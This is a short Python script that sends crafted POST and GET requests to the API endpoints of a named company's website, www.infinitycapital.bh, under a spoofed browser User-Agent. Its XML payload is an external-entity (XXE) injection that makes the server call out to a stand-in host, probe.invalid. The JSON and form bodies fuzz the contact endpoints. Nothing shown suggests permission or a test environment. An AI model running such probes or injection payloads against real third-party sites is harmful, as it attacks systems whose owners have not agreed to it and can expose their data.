import requests, json
S = requests.Session()
S.headers.update({'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36'})
HOST = 'www.' + 'infinitycapital' + '.bh'
B = 'https://' + HOST
paths = ['/api/contact','/api/send','/api/']
payloads = [
  ('json', {'Content-Type':'application/json'}, json.dumps({"name":"t","email":"t@"+"probe.local","message":"hi"})),
  ('form', {'Content-Type':'application/x-www-form-urlencoded'}, "fname=t&lname=S&areacode=973&tel=5551234&cname=QA&subject=Hello&msg=Testing&check=on&targets=x"),
  ('xml',  {'Content-Type':'application/xml'}, '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://probe.invalid/e">]><r>&x;</r>'),
]
for p in paths:
    for tag, hdr, data in payloads:
        try:
            r = S.post(B+p, headers=hdr, data=data, timeout=25, allow_redirects=False)
            print(p, tag, r.status_code, r.headers.get('content-type'), len(r.content))
            print(repr(r.text[:500]))
        except Exception as e:
            print(p, tag, 'ERR', type(e).__name__, str(e)[:120])
    print('-'*50)
# GET variants
for p in paths:
    r = S.get(B+p, timeout=20, allow_redirects=False)
    print('GET', p, r.status_code, r.headers.get('content-type'), len(r.content), r.headers.get('location'))
